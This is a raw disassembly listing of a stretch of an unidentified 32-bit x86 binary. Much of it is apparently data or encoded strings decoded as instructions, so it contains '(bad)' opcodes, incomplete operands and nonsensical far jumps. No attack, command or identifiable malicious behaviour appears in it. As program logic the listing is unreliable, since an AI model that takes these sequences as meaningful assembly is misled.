  421b8d:	dec    edi
  421b8e:	cmp    eax,0x394e734e
  421b93:	dec    esi
  421b94:	mov    eax,ds:0x304e3a4f
  421b99:	dec    esi
  421b9a:	inc    esp
  421b9b:	dec    esi
  421b9c:	pop    esp
  421b9d:	lods   eax,DWORD PTR ds:[esi]
  421b9e:	pop    edi
  421b9f:	mov    ds:0xb36eb26f,al
  421ba4:	jle    0x421b69
  421ba6:	jns    0x421b68
  421ba8:	aas    
  421ba9:	dec    esi
  421baa:	mov    cs,WORD PTR [edi+0x30]
  421bad:	dec    esi
  421bae:	lods   al,BYTE PTR ds:[esi]
  421baf:	dec    edi
  421bb0:	cmp    eax,0x394e7e4e
  421bb5:	dec    esi
  421bb6:	lahf   
  421bb7:	dec    edi
  421bb8:	cmp    ecx,DWORD PTR [esi+0x30]
  421bbb:	dec    esi
  421bbc:	inc    ebp
  421bbd:	dec    esi
  421bbe:	pop    esp
  421bbf:	mov    ebp,0xc26fb25f
  421bc4:	outs   dx,BYTE PTR ds:[esi]
  421bc5:	ret    
  421bc6:	jle    0x421b9b
  421bc8:	jns    0x421b9a
  421bca:	aas    
  421bcb:	dec    esi
  421bcc:	mov    cs,WORD PTR [edi+0x30]
  421bcf:	dec    esi
  421bd0:	lods   al,BYTE PTR ds:[esi]
  421bd1:	dec    edi
  421bd2:	cmp    eax,0x394f804e
  421bd7:	dec    esi
  421bd8:	lods   al,BYTE PTR ds:[esi]
  421bd9:	dec    edi
  421bda:	cmp    cl,BYTE PTR [esi+0x30]
  421bdd:	dec    esi
  421bde:	inc    esi
  421bdf:	dec    esi
  421be0:	pop    esp
  421be1:	int    0x5f
  421be3:	ret    0xd26f
  421be6:	outs   dx,BYTE PTR ds:[esi]
  421be7:	sar    DWORD PTR [esi-0x1d],cl
  421bea:	jns    0x421bcc
  421bec:	aas    
  421bed:	dec    esi
  421bee:	mov    cs,WORD PTR [edi+0x30]
  421bf1:	dec    esi
  421bf2:	lods   al,BYTE PTR ds:[esi]
  421bf3:	dec    edi
  421bf4:	cmp    eax,0x394f834e
  421bf9:	dec    esi
  421bfa:	mov    ds:0x304e3a4f,al
  421bff:	dec    esi
  421c00:	inc    esp
  421c01:	dec    esi
  421c02:	pop    esp
  421c03:	fstp   QWORD PTR [edi-0x2e]
  421c06:	outs   dx,DWORD PTR ds:[esi]
  421c07:	loop   0x421c77
  421c09:	jecxz  0x421c89
  421c0b:	repz jns 0x421bfe
  421c0e:	aas    
  421c0f:	dec    esi
  421c10:	lea    ecx,[edi+0x30]
  421c13:	dec    esi
  421c14:	lahf   
  421c15:	dec    edi
  421c16:	cmp    eax,0x3c4fa04e
  421c1b:	dec    esi
  421c1c:	xor    BYTE PTR [esi+0x3f],cl
  421c1f:	dec    esi
  421c20:	pop    esp
  421c21:	in     eax,dx
  421c22:	pop    edi
  421c23:	loop   0x421c94
  421c25:	repnz outs dx,BYTE PTR ds:[esi]
  421c27:	repz jle 0x421c2d
  421c2a:	jns    0x421c2c
  421c2c:	jle    0x421c41
  421c2e:	jns    0x421c40
  421c30:	cmp    al,0x4e
  421c32:	jg     0x421c82
  421c34:	xor    BYTE PTR [esi-0x65],cl
  421c37:	dec    edi
  421c38:	xor    cl,BYTE PTR [esi-0x80]
  421c3b:	dec    edi
  421c3c:	cmp    al,0x4e
  421c3e:	lods   eax,DWORD PTR ds:[esi]
  421c3f:	dec    edi
  421c40:	cmp    ecx,DWORD PTR [esi+0x30]
  421c43:	dec    esi
  421c44:	inc    ebp
  421c45:	dec    esi
  421c46:	pop    esp
  421c47:	or     eax,0x126f025f
  421c4c:	outs   dx,BYTE PTR ds:[esi]
  421c4d:	adc    edi,DWORD PTR [esi+0x23]
  421c50:	jns    0x421c72
  421c52:	aas    
  421c53:	dec    esi
  421c54:	add    BYTE PTR [eax],al
  421c56:	ficomp WORD PTR [edx]
  421c58:	inc    edx
  421c59:	add    dl,dl
  421c5b:	sbb    al,0x42
  421c5d:	add    dl,bl
  421c5f:	sbb    al,0x42
  421c61:	add    BYTE PTR [edx-0x11ffbde2],al
  421c67:	sbb    eax,0x1e720042
  421c6c:	inc    edx
  421c6d:	add    BYTE PTR [edx-0x41ffbde4],bh
  421c73:	sbb    al,0x42
  421c75:	add    BYTE PTR [esi+0x1e],ch
  421c78:	inc    edx
  421c79:	add    BYTE PTR [edx],ah
  421c7b:	sbb    eax,0xa90d0042
  421c80:	pushf  
  421c81:	clc    
  421c82:	ss mov edx,0x1cd6f89c
  421c88:	inc    edx
  421c89:	add    BYTE PTR [esi-0x45ffbde3],ah
  421c8f:	sbb    eax,0x1dc60042
  421c94:	inc    edx
  421c95:	add    dh,dl
  421c97:	sbb    eax,0x1d0e0042
  421c9c:	inc    edx
  421c9d:	add    dl,bl
  421c9f:	sbb    al,BYTE PTR [edx+0x0]
  421ca2:	cs sbb eax,0x1d1e0042
  421ca8:	inc    edx
  421ca9:	add    BYTE PTR [esi-0x49ffbde2],al
  421caf:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  421cb6:	loop   0x421cd4
  421cb8:	inc    edx
  421cb9:	add    BYTE PTR [esp+ebx*1],dl
  421cbc:	push   ss
  421cbd:	or     DWORD PTR [eax],0x7050d
  421cc3:	add    BYTE PTR [eax+0x0],al
  421cc6:	cmp    al,BYTE PTR [edx+0x3e]
  421cc9:	ds enter 0x4279,0x0
  421cce:	ins    DWORD PTR es:[edi],dx
  421ccf:	push   ebp
  421cd0:	inc    esp
  421cd1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421cd7:	in     eax,dx
  421cd8:	inc    BYTE PTR [edi]
  421cda:	aas    
  421cdb:	cli    
  421cdc:	mov    ds:0x421cca05,eax
  421ce1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421ce7:	xchg   esi,eax
  421ce8:	pushf  
  421ce9:	clc    
  421cea:	mov    ah,0x95
  421cec:	pushf  
  421ced:	clc    
  421cee:	mov    ebx,0xbaf89c95
  421cf3:	xchg   ebp,eax
  421cf4:	pushf  
  421cf5:	clc    
  421cf6:	mov    ecx,0xb8f89c95
  421cfb:	xchg   ebp,eax
  421cfc:	pushf  
  421cfd:	clc    
  421cfe:	mov    edi,0xbef89c95
  421d03:	xchg   ebp,eax
  421d04:	pushf  
  421d05:	clc    
  421d06:	mov    ebp,0xa6f89c95
  421d0b:	xchg   ebp,eax
  421d0c:	pushf  
  421d0d:	clc    
  421d0e:	jmp    0x421a:0xd26003f9
  421d15:	add    BYTE PTR [eax+eax*2+0x42],ch
  421d19:	add    BYTE PTR [ebx+0x77],dl
  421d1c:	jbe    0x421d6e
  421d1e:	mov    dh,0x85
  421d20:	pushf  
  421d21:	clc    
  421d22:	sbb    ecx,ebp
  421d24:	push   eax
  421d25:	pop    es
  421d26:	sbb    BYTE PTR [ebx],cl
  421d28:	add    BYTE PTR [eax],al
  421d2a:	into   
  421d2b:	sbb    al,BYTE PTR [edx+0x0]
  421d2e:	sbb    ecx,DWORD PTR [ebx]
  421d30:	add    al,0xe
	...
  421d62:	ins    BYTE PTR es:[edi],dx
  421d63:	inc    eax
  421d64:	inc    edx
  421d65:	add    BYTE PTR [esi+0x66f89c85],dh
  421d6b:	add    BYTE PTR [edx+0x0],ch
  421d6e:	add    BYTE PTR [si+0x0],ah
  421d72:	push   0x64006700
  421d77:	add    BYTE PTR [esi+0x0],ah
  421d7a:	push   0x0
  421d7c:	push   0x66006400
  421d81:	add    BYTE PTR [edi+0x0],ah
  421d84:	push   0x0
  421d86:	push   0x66006700
  421d8b:	add    BYTE PTR [eax+0x0],ch
  421d8e:	add    BYTE PTR [bp+0x0],ah
  421d92:	push   0x66006700
	...
  421d9f:	add    BYTE PTR [eax],al
  421da1:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421da7:	dec    edi
  421da8:	lahf   
  421da9:	dec    edi
  421daa:	mov    ds:0x9f4fa64f,al
  421daf:	dec    edi
  421db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421db1:	dec    edi
  421db2:	ins    DWORD PTR es:[edi],dx
  421db3:	dec    esi
  421db4:	bound  ecx,QWORD PTR [esi+0x30]
  421db7:	dec    esi
  421db8:	add    BYTE PTR [eax],al
  421dba:	cdq    
  421dbb:	dec    edi
  421dbc:	pushf  
  421dbd:	dec    edi
  421dbe:	fwait
  421dbf:	dec    edi
  421dc0:	ins    DWORD PTR es:[edi],dx
  421dc1:	dec    esi
  421dc2:	bound  ecx,QWORD PTR [esi+0x30]
  421dc5:	dec    esi
  421dc6:	scas   eax,DWORD PTR es:[edi]
  421dc7:	dec    edi
  421dc8:	lods   eax,DWORD PTR ds:[esi]
  421dc9:	dec    edi
  421dca:	lahf   
  421dcb:	dec    edi
  421dcc:	mov    ds:0x624e6d4f,al
  421dd1:	dec    esi
  421dd2:	xor    BYTE PTR [esi+0x0],cl
  421dd5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421ddb:	dec    edi
  421ddc:	test   eax,0xa04f934f
  421de1:	dec    edi
  421de2:	fwait
  421de3:	dec    edi
  421de4:	xor    BYTE PTR [esi+0x0],cl
  421de7:	add    BYTE PTR [eax],al
  421de9:	add    BYTE PTR [eax],al
  421deb:	add    BYTE PTR [eax],al
  421ded:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421df4:	mov    WORD PTR [ebp-0x32734274],gs
  421dfa:	mov    ebp,ds
  421dfc:	mov    ebp,gs
  421dfe:	mov    ebp,?
  421e00:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421e06:	mov    WORD PTR ds:0x6d8c5d8c,?
  421e0c:	mov    WORD PTR [edx-0x74],?
  421e0f:	jae    0x421d9d
  421e11:	jo     0x421d9f
  421e13:	jno    0x421da1
  421e15:	jbe    0x421da3
  421e17:	ja     0x421da5
  421e19:	je     0x421da7
  421e1b:	jne    0x421da9
  421e1d:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e24:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e2a:	lods   al,BYTE PTR ds:[esi]
  421e2b:	jge    0x421de9
  421e2d:	jge    0x421dcd
  421e2f:	(bad)  
  421e30:	jns    0x421ea5
  421e32:	mov    ecx,0x7d738cb1
  421e37:	ins    DWORD PTR es:[edi],dx
  421e38:	enter  0x9fc6,0x26
  421e3c:	jb     0x421e41
  421e3e:	test   eax,0xb956bb17
  421e43:	hlt    
  421e44:	test   al,0x37
  421e46:	test   al,0x7e
  421e48:	fnstenv [ecx-0x6a]
  421e4b:	mov    cl,0x6a
  421e4d:	push   0xffffffce
  421e4f:	or     BYTE PTR [edx],bl
  421e51:	xlat   BYTE PTR ds:[ebx]
  421e52:	out    dx,eax
  421e53:	add    eax,0x9321d7aa
  421e58:	scas   al,BYTE PTR es:[edi]
  421e59:	adc    DWORD PTR [esi],esp
  421e5b:	jge    0x421e80
  421e5d:	fidiv  WORD PTR [edi]
  421e5f:	leave  
  421e60:	hlt    
  421e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e62:	cmp    ax,0x1fc8
  421e66:	mov    dh,cl
  421e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e69:	(bad)  
  421e6a:	and    DWORD PTR [eax],ebx
  421e6c:	and    DWORD PTR [ecx-0x18],esi
  421e6f:	(bad)  [ebx+0x7]
  421e72:	cmc    
  421e73:	enter  0x301a,0x14
  421e77:	inc    eax
  421e78:	inc    edx
  421e79:	add    BYTE PTR [ecx+0x66],dh
  421e7c:	jp     0x421eec
  421e7e:	ret    0x421c
  421e81:	add    BYTE PTR [esi],ah
  421e83:	sbb    eax,0xed080042
  421e88:	adc    al,BYTE PTR [edi]
  421e8a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421e91:	ins    BYTE PTR es:[edi],dx
  421e92:	push   0x49657557
  421e97:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421e9d:	push   edi
  421e9e:	jp     0x421f1a
  421ea0:	dec    ebp
  421ea1:	push   esi
  421ea2:	arpl   WORD PTR gs:[ecx+0x45],si
  421ea6:	dec    edx
  421ea7:	dec    esi
  421ea8:	data16 ja 0x421ef9
  421eab:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ec6:	inc    ebp
  421ec7:	push   edx
  421ec8:	jb     0x421f3e
  421eca:	inc    esi
  421ecb:	je     0x421f0e
  421ecd:	inc    esi
  421ece:	jae    0x421f46
  421ed0:	dec    ebx
  421ed1:	gs dec ecx
  421ed3:	dec    ebp
  421ed4:	dec    ebp
  421ed5:	pop    edx
  421ed6:	jp     0x421f32
  421ed8:	jbe    0x421f20
  421eda:	pop    ecx
  421edb:	jo     0x421f55
  421edd:	inc    edi
  421ede:	gs ins BYTE PTR es:[edi],dx
  421ee0:	dec    esp
  421ee1:	js     0x421f4b
  421ee3:	inc    edx
  421ee4:	js     0x421f2c
  421ee6:	dec    eax
  421ee7:	inc    ebp
  421ee8:	inc    esp
  421ee9:	inc    esp
  421eea:	push   ecx
  421eeb:	dec    edx
  421eec:	ins    BYTE PTR es:[edi],dx
  421eed:	dec    ebx
  421eee:	jbe    0x421f5e
  421ef0:	pop    eax
  421ef1:	jbe    0x421f3e
  421ef3:	inc    ecx
  421ef4:	fs gs jno 0x421f65
  421ef8:	push   ebx
  421ef9:	inc    ecx
  421efa:	add    BYTE PTR [eax],al
  421efc:	inc    ebx
  421efd:	outs   dx,BYTE PTR ds:[esi]
  421efe:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421f02:	push   edx
  421f03:	push   ecx
  421f04:	push   0x74000064
  421f09:	jne    0x421f80
  421f0b:	ins    DWORD PTR es:[edi],dx
  421f0c:	push   ecx
  421f0d:	push   eax
  421f0e:	jo     0x421f8a
  421f10:	addr16 jo 0x421f69
  421f13:	pop    eax
  421f14:	add    BYTE PTR [eax],al
  421f16:	push   ecx
  421f17:	pop    ecx
  421f18:	inc    ebx
  421f19:	inc    edx
  421f1a:	outs   dx,BYTE PTR ds:[esi]
  421f1b:	popa   
  421f1c:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f20:	jne    0x421f90
  421f22:	dec    ebx
  421f23:	je     0x421f88
  421f25:	bound  esp,QWORD PTR [edi+0x0]
  421f28:	jns    0x421f6f
  421f2a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f2d:	dec    ecx
  421f2e:	ja     0x421f75
  421f30:	dec    eax
  421f31:	inc    ebp
  421f32:	inc    edx
  421f33:	push   ebx
  421f34:	add    BYTE PTR [eax],al
  421f36:	outs   dx,DWORD PTR ds:[esi]
  421f37:	inc    edi
  421f38:	dec    esi
  421f39:	outs   dx,DWORD PTR ds:[esi]
  421f3a:	pop    ecx
  421f3b:	inc    edi
  421f3c:	jb     0x421f85
  421f3e:	jns    0x421fb6
  421f40:	inc    ecx
  421f41:	pop    eax
  421f42:	dec    esp
  421f43:	add    BYTE PTR [eax+0x48],bh
  421f46:	bound  edx,QWORD PTR [ebx+0x43]
  421f49:	pop    eax
  421f4a:	outs   dx,DWORD PTR ds:[esi]
  421f4b:	push   0x4355
  421f50:	dec    esp
  421f51:	ins    BYTE PTR es:[edi],dx
  421f52:	inc    edx
  421f53:	push   0x76666a73
  421f58:	inc    edx
  421f59:	jo     0x421f5b
  421f5b:	add    BYTE PTR [eax],al
  421f5d:	add    BYTE PTR [edi+0x6d],ah
  421f60:	je     0x421fa9
  421f62:	ins    BYTE PTR es:[edi],dx
  421f63:	jae    0x421fcf
  421f65:	inc    esi
  421f66:	ins    DWORD PTR es:[edi],dx
  421f67:	je     0x421fbf
  421f69:	push   0x56584178
  421f6e:	push   ebx
  421f6f:	addr16 dec edx
  421f71:	jo     0x421fe5
  421f73:	js     0x421fe4
  421f75:	pop    eax
  421f76:	dec    ebx
  421f77:	push   esp
  421f78:	dec    esp
  421f79:	jns    0x421fc6
  421f7b:	js     0x421ff5
  421f7d:	outs   dx,BYTE PTR ds:[esi]
  421f7e:	pop    ecx
  421f7f:	jae    0x421fef
  421f81:	push   0x43644448
  421f86:	arpl   WORD PTR [edx+0x55],sp
  421f89:	push   0x42504e67
  421f8e:	push   ebp
  421f8f:	je     0x422006
  421f91:	addr16 dec edi
  421f93:	dec    esp
  421f94:	inc    edx
  421f95:	ins    DWORD PTR es:[edi],dx
  421f96:	inc    esi
  421f97:	inc    esi
  421f98:	inc    esi
  421f99:	arpl   WORD PTR [edx+0x47],bx
  421f9c:	push   ebp
  421f9d:	inc    ebx
  421f9e:	popa   
  421f9f:	push   edx
  421fa0:	dec    esp
  421fa1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421fa8:	push   ecx
  421fa9:	push   ebx
  421faa:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421fb1:	dec    edx
  421fb2:	jns    0x42201d
  421fb4:	push   edx
  421fb5:	inc    ebx
  421fb6:	jo     0x42202d
  421fb8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421fbc:	fs push ebx
  421fbe:	inc    ebx
  421fbf:	push   ebp
  421fc0:	push   eax
  421fc1:	ja     0x421ffe
  421fc3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fc7:	mov    ebp,0xa53ddffb
  421fcc:	js     0x421f87
  421fce:	pop    edi
  421fcf:	sbb    cl,BYTE PTR [edi]
  421fd1:	mov    ds:0x1d673,eax
  421fd6:	pop    esp
  421fd7:	add    BYTE PTR [eax],al
  421fd9:	add    bh,ah
  421fdb:	xchg   esi,eax
  421fdc:	pop    edx
  421fdd:	inc    ecx
  421fde:	inc    ebx
  421fdf:	or     DWORD PTR [eax],ebp
  421fe1:	adc    BYTE PTR [edi],0xe6
  421fe4:	outs   dx,DWORD PTR ds:[esi]
  421fe5:	push   ss
  421fe6:	push   edx
  421fe7:	out    0x31,al
  421fe9:	es sub dh,bl
  421fec:	push   ebx
  421fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fee:	ja     0x422022
  421ff0:	jnp    0x421f7c
  421ff2:	aas    
  421ff3:	cwde   
  421ff4:	sti    
  421ff5:	sar    DWORD PTR [ecx],cl
  421ff7:	call   0xcd39:0xbff9c39b
  421ffe:	xchg   edi,eax
  421fff:	xchg   dl,dl
  422001:	xchg   ebp,eax
  422002:	cmp    bh,dh
  422004:	(bad)  
  422005:	xor    al,0xf6
  422007:	pop    esi
  422008:	jae    0x422036
  42200a:	add    edx,ecx
  42200c:	jbe    0x422055
  42200e:	jp     0x421fd8
  422010:	mov    cl,0xe7
  422012:	mov    gs,WORD PTR ds:0xd4878707
  422018:	hlt    
  422019:	cmp    DWORD PTR [ebx+0x44022af6],0x46
  422020:	push   ds
  422021:	and    al,0x5b
  422023:	es pushf 
  422025:	sbb    ebx,esp
  422027:	stos   BYTE PTR es:[edi],al
  422028:	xlat   BYTE PTR ds:[ebx]
  422029:	popa   
  42202a:	test   al,0x9e
  42202c:	popf   
  42202d:	cld    
  42202e:	cdq    
  42202f:	jne    0x422044
  422031:	cmp    ah,dh
  422033:	xchg   ebx,eax
  422034:	mov    dh,bl
	...
  422042:	sub    BYTE PTR [edx+0x57bf52a5],dh
  422048:	(bad)  
  422049:	cli    
  42204a:	jl     0x4220b0
  42204c:	xlat   BYTE PTR ds:[ebx]
  42204d:	push   esi
  42204e:	stc    
  42204f:	xor    bh,dh
  422051:	aam    0xcf
  422053:	(bad)  
  422054:	add    DWORD PTR [eax],eax
  422056:	pop    esp
  422057:	add    BYTE PTR [eax],al
  422059:	add    BYTE PTR [edi],bl
  42205b:	xor    DWORD PTR [eax+eax*1-0x17],eax
  42205f:	js     0x421ffe
  422061:	push   cs
  422062:	cmp    eax,0xfa412779
  422067:	call   0x7e9b:0x46c47352
  42206e:	sbb    eax,0xa2095287
  422073:	push   edx
  422074:	imul   edi,ebx,0xffffff97
  422077:	xchg   edi,eax
  422078:	repnz cwde 
  42207a:	rol    DWORD PTR [ebx],1
  42207c:	inc    esi
  42207d:	test   eax,0x5b32f861
  422082:	dec    edi
  422083:	stos   BYTE PTR es:[edi],al
  422084:	rol    BYTE PTR [ebp-0x79],cl
  422087:	popa   
  422088:	pop    ecx
  422089:	mov    eax,ds:0x11e978b6
  42208e:	xchg   ebp,eax
  42208f:	adc    BYTE PTR [eax+0x67ad67e],ch
  422095:	jp     0x42202e
  422097:	les    eax,FWORD PTR [eax+0x295030d7]
  42209d:	and    al,0x6f
  42209f:	arpl   sp,sp
  4220a1:	dec    ecx
  4220a2:	and    esp,esp
  4220a4:	aas    
  4220a5:	jecxz  0x4220c9
  4220a7:	addr16 loopne 0x4220b3
  4220aa:	adc    bh,BYTE PTR [ebp-0x68]
  4220ad:	aad    0xdd
  4220af:	inc    edi
  4220b0:	push   0x85438dd5
  4220b5:	pop    ecx
	...
  4220c2:	mov    bl,0x55
  4220c4:	jg     0x422047
  4220c6:	jmp    FWORD PTR [ebx-0x69418801]
  4220cc:	push   0x8c0d9557
  4220d1:	pushf  
  4220d2:	sub    edx,edi
  4220d4:	add    DWORD PTR [eax],eax
  4220d6:	pop    esp
  4220d7:	add    BYTE PTR [eax],al
  4220d9:	add    cl,dh
  4220db:	std    
  4220dc:	shl    BYTE PTR [ebp+0x76],0xe6
  4220e0:	and    bl,dh
  4220e2:	or     al,al
  4220e4:	in     eax,0x57
  4220e6:	sub    ah,BYTE PTR [ebx+0x6fc3919]
  4220ec:	cmc    
  4220ed:	popf   
  4220ee:	popf   
  4220ef:	aam    0x6b
  4220f1:	dec    edi
  4220f2:	mov    DWORD PTR [edx],eax
  4220f4:	cmp    dl,BYTE PTR [esi+0xdd02c37]
  4220fa:	mov    ds:0xf057440d,al
  4220ff:	mov    al,0xb3
  422101:	loop   0x422086
  422103:	or     BYTE PTR [esi+eax*2],cl
  422106:	outs   dx,DWORD PTR ds:[esi]
  422107:	bswap  ecx
  422109:	push   ebp
  42210a:	cmp    dl,BYTE PTR [esi]
  42210c:	test   DWORD PTR [esi+0x376663d6],ebx
  422112:	ror    DWORD PTR [eax-0x2603947c],0x48
  422119:	je     0x422163
  42211b:	push   cs
  42211c:	fimul  DWORD PTR [ebx-0x1]
  42211f:	cld    
  422120:	xor    BYTE PTR [ebp+0x2fa52a12],bl
  422126:	gs mov ebp,0xc86f959c
  42212c:	and    DWORD PTR [ecx],ebp
  42212e:	pop    ds
  42212f:	cwde   
  422130:	push   ds
  422131:	inc    esi
  422132:	pop    esi
  422133:	cmp    dl,al
  422135:	rol    BYTE PTR [eax],0x0
	...
  422140:	add    BYTE PTR [eax],al
  422142:	cmp    dh,dl
  422144:	cmp    ah,BYTE PTR [esi+edi*8]
  422147:	in     al,dx
  422148:	fimul  WORD PTR ds:[edi+0x5dac6bd5]
  42214f:	psraw  mm2,mm5
  422152:	xchg   edi,edx
  422154:	add    DWORD PTR [eax],eax
  422156:	pop    esp
  422157:	add    BYTE PTR [eax],al
  422159:	add    ah,al
  42215b:	icebp  
  42215c:	movnti DWORD PTR [esi+ecx*4-0xcb34121],esi
  422164:	fcos   
  422166:	jl     0x4221c0
  422168:	adc    eax,0x9c1efdb4
  42216d:	adc    cl,bl
  42216f:	inc    ebp
  422171:	adc    dl,bl
  422173:	dec    edx
  422174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422175:	mov    DWORD PTR [edx-0x4f4c3acc],edi
  42217b:	outs   dx,DWORD PTR ds:[esi]
  42217c:	aaa    
  42217d:	int    0x3b
  42217f:	outs   dx,DWORD PTR ds:[esi]
  422180:	jae    0x4221ef
  422182:	jecxz  0x4221fe
  422184:	retf   0x587a
  422187:	pop    edi
  422188:	jg     0x422172
  42218a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42218b:	shl    DWORD PTR [edi],0xa9
  42218e:	add    BYTE PTR [edx+0x2],al
  422191:	lods   eax,DWORD PTR ds:[esi]
  422192:	cmp    ah,BYTE PTR [ecx]
  422194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422195:	adc    ecx,DWORD PTR [edx]
  422197:	mov    WORD PTR [edi-0x14],ds
  42219a:	call   0x3f943c1c
  42219f:	xchg   edi,eax
  4221a0:	or     ecx,esi
  4221a2:	lods   al,BYTE PTR ds:[esi]
  4221a3:	out    0x39,eax
  4221a5:	cs pop esi
  4221a7:	add    DWORD PTR [ecx+0x2547a194],ebp
  4221ad:	sub    DWORD PTR [ebx+ebx*2+0x2c24e97e],ebx
  4221b4:	clc    
  4221b5:	fild   DWORD PTR [eax]
	...
  4221bf:	add    BYTE PTR [eax],al
  4221c1:	add    cl,bl
  4221c3:	mov    dh,0x66
  4221c5:	sbb    ebp,DWORD PTR [edi-0x25]
  4221c8:	std    
  4221c9:	neg    BYTE PTR [esi]
  4221cb:	sub    esp,DWORD PTR [ebx-0x23]
  4221ce:	rcr    BYTE PTR [edx-0x281c5626],0x1
  4221d5:	add    BYTE PTR [eax+eax*1+0x0],bl
  4221d9:	add    BYTE PTR [ecx],cl
  4221db:	jle    0x4221d9
  4221dd:	outs   dx,BYTE PTR ds:[esi]
  4221de:	test   eax,0xab1de399
  4221e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221e4:	xlat   BYTE PTR ds:[ebx]
  4221e5:	pop    ebp
  4221e6:	pop    ss
  4221e7:	(bad)  
  4221e9:	call   0xcab7:0xa64314db
  4221f0:	jno    0x422254
  4221f2:	mov    bl,0xcb
  4221f4:	mov    esp,0x9e571feb
  4221f9:	xor    eax,0xe689aceb
  4221fe:	sbb    eax,0x27dd0928
  422203:	fcmove st,st(5)
  422205:	inc    edi
  422206:	pop    es
  422207:	xchg   esi,eax
  422208:	int3   
  422209:	cmp    esp,edx
  42220b:	aas    
  42220c:	pop    ss
  42220d:	lahf   
  42220e:	loopne 0x4221a9
  422210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422211:	cwde   
  422212:	pop    esp
  422213:	xor    bl,BYTE PTR [edx-0x21]
  422216:	outs   dx,DWORD PTR ds:[esi]
  422217:	jne    0x4221cc
  422219:	(bad)  
  42221a:	shl    BYTE PTR [ecx-0x10dfa5c8],0xc6
  422221:	push   cs
  422222:	and    sp,WORD PTR [eax+0x656143c7]
  422229:	jge    0x422284
  42222b:	sbb    DWORD PTR [edi+ebx*8],eax
  42222e:	xchg   esi,eax
  42222f:	mov    ebp,0xf728813d
  422234:	daa    
  422235:	mov    ebx,0x0
	...
  422242:	fidiv  DWORD PTR [edx]
  422244:	xchg   edi,eax
  422245:	mov    bh,bh
  422247:	scas   eax,DWORD PTR es:[edi]
  422248:	fbstp  TBYTE PTR [edx+0x3]
  42224b:	inc    ebp
  42224c:	mov    ds:0x2cc8c25c,eax
  422251:	xchg   BYTE PTR [edi],bh
  422253:	fadd   DWORD PTR [ecx]
  422255:	add    BYTE PTR [eax+eax*1+0x0],bl
  422259:	add    BYTE PTR [edx],bh
  42225b:	xchg   DWORD PTR [edx-0x5f3dd6fc],edx
  422261:	je     0x42224e
  422263:	xlat   BYTE PTR ds:[ebx]
  422264:	lock xor eax,0xc9306396
  42226a:	loope  0x422241
  42226c:	call   0x41581abc
  422271:	ja     0x4222d9
  422273:	jne    0x422281
  422275:	push   esp
  422276:	stc    
  422277:	push   ebx
  422278:	arpl   WORD PTR [ecx],di
  42227a:	bnd jno 0x422261
  42227d:	or     edi,DWORD PTR [ebx+0x395777a3]
  422283:	xchg   ebp,eax
  422284:	aas    
  422285:	imul   ebx,ecx,0xce89da3a
  42228b:	out    0x81,al
  42228d:	rcl    edi,1
  42228f:	aad    0xa1
  422291:	out    0x68,al
  422293:	mov    eax,ds:0x4f239e77
  422298:	out    0x1c,al
  42229a:	cmp    BYTE PTR [edx+0x5],bl
  42229d:	retf   
  42229e:	pop    esp
  42229f:	aam    0xdd
  4222a1:	push   0xed90dc2a
  4222a6:	repnz xor BYTE PTR [edi-0x48abecda],bl
  4222ad:	in     eax,0x2b
  4222af:	dec    esp
  4222b0:	test   DWORD PTR [eax+0x63],edx
  4222b3:	aas    
  4222b4:	jmp    0x4222ed
	...
  4222c2:	dec    eax
  4222c3:	in     al,0x3
  4222c5:	fwait
  4222c6:	scas   eax,DWORD PTR es:[edi]
  4222c7:	(bad)  
  4222c8:	fdiv   st,st(7)
  4222ca:	pop    esi
  4222cb:	sub    BYTE PTR [eax+0x41e5f78f],bl
  4222d1:	sbb    DWORD PTR [ebx+0x5c0001d8],ebx
  4222d7:	add    BYTE PTR [eax],al
  4222d9:	add    BYTE PTR [edi+0x36],cl
  4222dc:	xchg   edx,eax
  4222dd:	mov    bh,bl
  4222df:	ins    BYTE PTR es:[edi],dx
  4222e0:	xchg   edi,eax
  4222e1:	cmp    ah,bl
  4222e3:	jne    0x422319
  4222e5:	add    eax,0x4aee70a
  4222ea:	out    0xf2,eax
  4222ec:	sbb    BYTE PTR [eax+0x5b],ch
  4222ef:	pop    ds
  4222f0:	push   es
  4222f1:	or     BYTE PTR [edx-0x59],0x4c
  4222f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222f6:	jnp    0x4222cf
  4222f8:	imul   esp,DWORD PTR [ecx-0x32e79191],0xffffffbb
  4222ff:	add    al,BYTE PTR [edi+0x1a]
  422302:	inc    edx
  422303:	out    0x65,al
  422305:	jmp    0xaf09:0xaef74035
  42230c:	cdq    
  42230d:	outs   dx,BYTE PTR ds:[esi]
  42230e:	pop    ebx
  42230f:	mov    edi,0x1fbbe78a
  422314:	xor    bl,BYTE PTR [edx-0x5e9a3f44]
  42231a:	cmpxchg8b QWORD PTR [esi+ebx*8]
  42231e:	out    dx,eax
  42231f:	cwde   
  422320:	sub    ecx,DWORD PTR [ebx]
  422322:	inc    esp
  422323:	and    esi,esi
  422325:	leave  
  422326:	jae    0x4222ee
